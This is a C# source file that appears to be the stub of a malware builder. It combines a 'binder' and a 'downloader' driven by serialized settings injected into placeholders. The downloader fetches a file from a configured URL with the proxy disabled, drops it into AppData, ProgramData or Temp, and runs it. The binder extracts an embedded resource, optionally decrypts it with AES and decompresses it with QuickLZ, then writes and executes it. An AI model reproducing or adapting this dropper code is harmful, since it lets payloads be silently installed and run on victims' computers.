//#define ENCRYPTION
//#define COMPRESSION
//#define BINDER
//#define DOWNLOADER
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;

namespace Worker
{
    public class Worker
    {

        //Downloads stored as base64

        private Assembly Asm;

        public Worker(Type t)
        {
            Asm = t.Assembly;

#if BINDER || DOWNLOADER
            List<string> options = new List<string>();

            /*SERIALIZED_SETTINGS*/

            List<Dictionary<string, string>> decoded = new List<Dictionary<string, string>>();

            foreach (string s in options)
            {
                decoded.Add(Deserialize(s));
            }

            foreach(Dictionary<string,string> d in decoded)
            {
                Execute(d);
            }
#endif


        }

#if BINDER || DOWNLOADER
        private void Execute(Dictionary<string, string> options)
        {
            if (options["k"] == "b") //binder
            {
#if BINDER
                ExecuteBinder(options);
                return;
#endif
            }
            else //k = d //downloader
            {
#if DOWNLOADER
                ExecuteDownloader(options);
                return;
#endif
            }
        }
#endif
#if DOWNLOADER
        private void ExecuteDownloader(Dictionary<string, string> options)
        {
            string url = options["u"];

            string path = ConstructPath(options);

            if (File.Exists(path))
            {
                try
                {
                    File.Delete(path);

                }
                catch
                {
                    return;
                }
            }

            using (WebClient wc = new WebClient())
            {


                wc.Proxy = null;
                byte[] data = wc.DownloadData(url);

                File.WriteAllBytes(path, data);



            }

            if (options["e"] == "y") //execute = y
            {
                Process.Start(path);
            }
        }
#endif

#if BINDER
        private void ExecuteBinder(Dictionary<string, string> options)
        {
            //QuickLZ

            string resource = options["r_k"];

            byte[] buffer = ReadResources(resource) as byte[];

            if (buffer == null) return;

#if ENCRYPTION

            byte[] key = Convert.FromBase64String(options["ek"]);
            byte[] iv = Convert.FromBase64String(options["ei"]);

            using(RijndaelManaged rij = new RijndaelManaged())
            {
                rij.Key = key;
                rij.IV = iv;
                using(ICryptoTransform ict = rij.CreateDecryptor())
                {
                    buffer = ict.TransformFinalBlock(buffer, 0, buffer.Length);
                }
            }

#endif

#if COMPRESSION

            buffer = QuickLZ.decompress(buffer);

#endif

            string path = ConstructPath(options);

            if (File.Exists(path))
            {
                try
                {
                    File.Delete(path);

                }
                catch
                {
                    return;
                }
            }

            File.WriteAllBytes(path, buffer);

            if (options["e"] == "y") //execute = y
            {
                Process.Start(path);
            }

        }
#endif

#if BINDER
        private object ReadResources(string name)
        {
            string resName = "%RESNAME%";
            
            using (Stream s = Asm.GetManifestResourceStream(resName))
            {
                using (ResourceReader rr = new ResourceReader(s))
                {
                    IDictionaryEnumerator en = rr.GetEnumerator();

                    while (en.MoveNext())
                    {
                        if ((string)en.Key == name) return en.Value;
                    }
                }
            }
            return null;
        }
#endif

#if BINDER || DOWNLOADER
        private string ConstructPath(Dictionary<string, string> options)
        {
            string dropDir = options["df"]; //drop_folder

            switch (dropDir)
            {
                case "ad"://appdata
                    dropDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    break;
                case "pd"://programdata
                    dropDir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                    break;
                case "t"://temp
                    dropDir = Path.GetTempPath();
                    break;
                case "cd"://current directory
                    dropDir = Environment.CurrentDirectory;
                    break;
            }

            string subFolder = options["sf"];//sub_folder

            if (!string.IsNullOrEmpty(subFolder))
            {
                dropDir = Path.Combine(dropDir, subFolder);

                if (!Directory.Exists(dropDir)) Directory.CreateDirectory(dropDir).Refresh();
            }

            string fileName = options["fn"];//file_name

            fileName = Path.Combine(dropDir, fileName);

            return fileName;
        }

        private Dictionary<string, string> Deserialize(string s)
        {
            byte[] buffer = Convert.FromBase64String(s);

            Dictionary<string, string> dic = new Dictionary<string, string>();

            using (MemoryStream ms = new MemoryStream(buffer))
            {
                using (BinaryReader br = new BinaryReader(ms, Encoding.UTF8))
                {
                    int c = br.ReadInt32();

                    while (c > 0)
                    {
                        string key = br.ReadString();
                        string value = br.ReadString();

                        dic.Add(key, value);
                        c--;
                    }

                }
            }

            return dic;

        }
#endif


#if COMPRESSION && BINDER
        static class QuickLZ
        {
            // Streaming mode not supported

            // Bounds checking not supported  Use try...catch instead


            // Decrease QLZ_POINTERS_3 to increase level 3 compression speed. Do not edit any other values!
            private const int HASH_VALUES = 4096;

            private const int UNCONDITIONAL_MATCHLEN = 6;
            private const int UNCOMPRESSED_END = 4;
            private const int CWORD_LEN = 4;


            private static int headerLen(byte[] source)
            {
                return ((source[0] & 2) == 2) ? 9 : 3;
            }

            public static int sizeDecompressed(byte[] source)
            {
                if (headerLen(source) == 9)
                    return source[5] | (source[6] << 8) | (source[7] << 16) | (source[8] << 24);
                else
                    return source[2];
            }

            private static void fast_write(byte[] a, int i, int value, int numbytes)
            {
                for (int j = 0; j < numbytes; j++)
                    a[i + j] = (byte)(value >> (j * 8));
            }

            public static byte[] decompress(byte[] source)
            {
                int level;
                int size = sizeDecompressed(source);
                int src = headerLen(source);
                int dst = 0;
                uint cword_val = 1;
                byte[] destination = new byte[size];
                int[] hashtable = new int[4096];
                byte[] hash_counter = new byte[4096];
                int last_matchstart = size - UNCONDITIONAL_MATCHLEN - UNCOMPRESSED_END - 1;
                int last_hashed = -1;
                int hash;
                uint fetch = 0;

                level = (source[0] >> 2) & 0x3;

                if (level != 1 && level != 3)
                    throw new ArgumentException("C# version only supports level 1 and 3");

                if ((source[0] & 1) != 1)
                {
                    byte[] d2 = new byte[size];
                    System.Array.Copy(source, headerLen(source), d2, 0, size);
                    return d2;
                }

                for (;;)
                {
                    if (cword_val == 1)
                    {
                        cword_val = (uint)(source[src] | (source[src + 1] << 8) | (source[src + 2] << 16) | (source[src + 3] << 24));
                        src += 4;
                        if (dst <= last_matchstart)
                        {
                            if (level == 1)
                                fetch = (uint)(source[src] | (source[src + 1] << 8) | (source[src + 2] << 16));
                            else
                                fetch = (uint)(source[src] | (source[src + 1] << 8) | (source[src + 2] << 16) | (source[src + 3] << 24));
                        }
                    }

                    if ((cword_val & 1) == 1)
                    {
                        uint matchlen;
                        uint offset2;

                        cword_val = cword_val >> 1;

                        if (level == 1)
                        {
                            hash = ((int)fetch >> 4) & 0xfff;
                            offset2 = (uint)hashtable[hash];

                            if ((fetch & 0xf) != 0)
                            {
                                matchlen = (fetch & 0xf) + 2;
                                src += 2;
                            }
                            else
                            {
                                matchlen = source[src + 2];
                                src += 3;
                            }
                        }
                        else
                        {
                            uint offset;
                            if ((fetch & 3) == 0)
                            {
                                offset = (fetch & 0xff) >> 2;
                                matchlen = 3;
                                src++;
                            }
                            else if ((fetch & 2) == 0)
                            {
                                offset = (fetch & 0xffff) >> 2;
                                matchlen = 3;
                                src += 2;
                            }
                            else if ((fetch & 1) == 0)
                            {
                                offset = (fetch & 0xffff) >> 6;
                                matchlen = ((fetch >> 2) & 15) + 3;
                                src += 2;
                            }
                            else if ((fetch & 127) != 3)
                            {
                                offset = (fetch >> 7) & 0x1ffff;
                                matchlen = ((fetch >> 2) & 0x1f) + 2;
                                src += 3;
                            }
                            else
                            {
                                offset = (fetch >> 15);
                                matchlen = ((fetch >> 7) & 255) + 3;
                                src += 4;
                            }
                            offset2 = (uint)(dst - offset);
                        }

                        destination[dst + 0] = destination[offset2 + 0];
                        destination[dst + 1] = destination[offset2 + 1];
                        destination[dst + 2] = destination[offset2 + 2];

                        for (int i = 3; i < matchlen; i += 1)
                        {
                            destination[dst + i] = destination[offset2 + i];
                        }

                        dst += (int)matchlen;

                        if (level == 1)
                        {
                            fetch = (uint)(destination[last_hashed + 1] | (destination[last_hashed + 2] << 8) | (destination[last_hashed + 3] << 16));
                            while (last_hashed < dst - matchlen)
                            {
                                last_hashed++;
                                hash = (int)(((fetch >> 12) ^ fetch) & (HASH_VALUES - 1));
                                hashtable[hash] = last_hashed;
                                hash_counter[hash] = 1;
                                fetch = (uint)(fetch >> 8 & 0xffff | destination[last_hashed + 3] << 16);
                            }
                            fetch = (uint)(source[src] | (source[src + 1] << 8) | (source[src + 2] << 16));
                        }
                        else
                        {
                            fetch = (uint)(source[src] | (source[src + 1] << 8) | (source[src + 2] << 16) | (source[src + 3] << 24));
                        }
                        last_hashed = dst - 1;
                    }
                    else
                    {
                        if (dst <= last_matchstart)
                        {
                            destination[dst] = source[src];
                            dst += 1;
                            src += 1;
                            cword_val = cword_val >> 1;

                            if (level == 1)
                            {
                                while (last_hashed < dst - 3)
                                {
                                    last_hashed++;
                                    int fetch2 = destination[last_hashed] | (destination[last_hashed + 1] << 8) | (destination[last_hashed + 2] << 16);
                                    hash = ((fetch2 >> 12) ^ fetch2) & (HASH_VALUES - 1);
                                    hashtable[hash] = last_hashed;
                                    hash_counter[hash] = 1;
                                }
                                fetch = (uint)(fetch >> 8 & 0xffff | source[src + 2] << 16);
                            }
                            else
                            {
                                fetch = (uint)(fetch >> 8 & 0xffff | source[src + 2] << 16 | source[src + 3] << 24);
                            }
                        }
                        else
                        {
                            while (dst <= size - 1)
                            {
                                if (cword_val == 1)
                                {
                                    src += CWORD_LEN;
                                    cword_val = 0x80000000;
                                }

                                destination[dst] = source[src];
                                dst++;
                                src++;
                                cword_val = cword_val >> 1;
                            }
                            return destination;
                        }
                    }
                }
            }
        }
#endif
    }
}
